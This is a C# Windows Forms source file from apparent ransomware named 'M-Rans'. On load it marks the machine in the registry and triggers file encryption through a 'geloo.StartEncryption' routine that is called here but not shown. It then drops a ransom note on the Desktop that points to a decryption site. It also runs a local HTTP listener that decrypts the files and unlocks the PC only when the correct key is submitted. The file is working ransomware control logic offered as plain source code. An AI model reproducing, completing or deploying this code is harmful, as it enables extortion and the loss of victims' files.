using System;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.IO;

namespace M_Engine
{
    public partial class hidden : Form
    {
        private HttpListener _listener;

        public hidden()
        {
            InitializeComponent();
        }
        static void Create_key()
        {
            try
            {
                string keyPath = @"Software\M-Rans";
                string valueName = "first-time";

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath, true)) // Ensures write access
                {
                    if (key != null)
                    {
                        if (key.GetValue(valueName) == null)
                        {
                            key.SetValue(valueName, 1, RegistryValueKind.DWord);
                            //* Registry key created and value set to 1. *//
                        }
                        else
                        {
                            Console.WriteLine($"Registry key already exists with value: {key.GetValue(valueName)}");
                        }
                    }
                    else
                    {
                        Console.WriteLine("Failed to create or open the registry key.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creating registry key: {ex.Message}");
            }
        }


        static bool isFirstTime()
        {
            try
            {
                string keyPath = @"Software\M-Rans";
                string valueName = "first-time";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, false)) // Open in read-only mode
                {
                    if (key?.GetValue(valueName) == null)
                    {
                        return true; 
                    }
                    else
                    {
                        return false; 
                    }
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        static bool VerifyPassword(string receivedKey, string storedHashedPassword)
        {
            return BCrypt.Net.BCrypt.Verify(receivedKey, storedHashedPassword);
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                M_Engine.Handle.adtsup();

                if (isFirstTime())
                {
                    Create_key();
                    await Task.Run(() => geloo.StartEncryption());

                }
                else
                {
                    await Task.Run(() => geloo.StartEncryption());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error");
            }
            finally
            {
                StartApiServer();
                // Create README.txt file
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string readmePath = Path.Combine(path, "README.txt");
                if (!File.Exists(readmePath))
                {
                    File.WriteAllText(readmePath, "Your files have been encrypted. To decrypt your files, please\n visit https://h1ack.me/u0/a/m-rans in your web browser to showing you decrypt steps !\n M-Rans Team.");
                }
            }
        }

        string exe_file(string path, string chara)
        {
            var exefiles = Directory.GetFiles(path, "*.exe", SearchOption.AllDirectories);

            foreach (string file in exefiles)
            {
                if (Path.GetFileName(file).Contains(chara))
                {
                    return file;
                }
            }
            return string.Empty;
        }

        private void StartApiServer()
        {
            _listener = new HttpListener();
            _listener.Prefixes.Add("http://localhost:1401/");
            _listener.Start();
            _listener.BeginGetContext(new AsyncCallback(ListenerCallback), _listener);
        }

        private void ListenerCallback(IAsyncResult ar)
        {
            HttpListenerContext context = _listener.EndGetContext(ar);
            HttpListenerRequest request = context.Request;
            HttpListenerResponse response = context.Response;


                if (request.HttpMethod == "POST" && request.Url.AbsolutePath == "/api/post/pass")
                {
                

                string requestBody = new System.IO.StreamReader(request.InputStream).ReadToEnd();
                string receivedKey = null;

                string[] parameters = requestBody.Split('&');
                foreach (var param in parameters)
                {
                    var keyValue = param.Split('=');
                    if (keyValue[0] == "key")
                    {
                        receivedKey = Uri.UnescapeDataString(keyValue[1]);
                        break;
                    }
                }

                if (VerifyPassword(receivedKey, config.PassKey))
                {
                    //* Decrypt if received Key correct *//
                    // geloo AES Decryption *//

                    ungeloo.StartDecryption();

                    M_Engine.Handle.UnlockApplication();

                    MessageBox.Show("M-Rans : Your Pc is unlocked now, you can explore your files", "Done !");

                    string responseString = "{\"message\":\"Success!\"}";
                    byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                    response.ContentLength64 = buffer.Length;
                    response.ContentType = "application/json";
                    response.OutputStream.Write(buffer, 0, buffer.Length);
                }
                else
                {

                    MessageBox.Show("Not Correct !", "M-Rans");


                    string responseString = "{\"error\":\"Invalid key\"}";
                    byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                    response.StatusCode = (int)HttpStatusCode.Unauthorized;
                    response.ContentLength64 = buffer.Length;
                    response.ContentType = "application/json";
                    response.OutputStream.Write(buffer, 0, buffer.Length);
                }
            }
            else
            {
                string responseString = "{\"error\":\"Not Found\"}";
                byte[] buffer = Encoding.UTF8.GetBytes(responseString);
                response.StatusCode = (int)HttpStatusCode.NotFound;
                response.ContentLength64 = buffer.Length;
                response.ContentType = "application/json";
                response.OutputStream.Write(buffer, 0, buffer.Length);
            }

            response.OutputStream.Close();

            _listener.BeginGetContext(new AsyncCallback(ListenerCallback), _listener);
        }

        private void hidden_FormClosed(object sender, FormClosedEventArgs e)
        {
            _listener.Stop();
        }
    }
}
